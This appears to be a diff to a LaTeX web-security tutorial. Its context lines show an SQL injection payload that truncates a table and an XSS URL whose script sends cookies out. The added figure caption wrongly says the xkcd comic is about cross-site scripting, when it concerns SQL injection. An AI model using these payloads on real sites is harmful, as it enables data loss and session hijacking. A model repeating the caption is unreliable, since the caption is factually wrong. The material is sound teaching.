@@ -70,6 +70,13 @@ SELECT * FROM posts WHERE uid = 1;TRUNCATE TABLE posts;
 
 This effectively deletes all records from the \texttt{posts} table.
 
+\begin{figure}[htb]
+  \begin{center}
+    \includegraphics[width=\textwidth]{images/exploits_of_a_mom}
+    \caption{Cross-site scripting once even was made the subject of the popular geek web comic \emph{xkcd}. This comic strip was used with permission. It is available online at \url{http://xkcd.com/327/}.}
+    \label{fig:exploits-of-a-mom}
+  \end{center}
+\end{figure}
 
 \subsection{Cross-Site Scripting (XSS)}
 \label{xss}\index{cross-site scripting}\index{XSS|see{cross-site scripting}}
@@ -98,6 +105,8 @@ http://example.com/blog.php?email=<script>image=new Image();
 This results in sending the current cookies to a (potentially) malicious server, allowing an attacker to hijack the user's current session.
 
 XSS opens the gates to many kinds of attacks. For example, it is possible to read the passwords from a login form after they have automatically been filled in by the browser's password storage. It also allows reading the clipboard content and sending it to another server.
+
+Even the site of the German government was susceptible to this type of vulnerability.~\cite{xss-bundesregierung}
 
 
 \subsection{Persistent XSS}
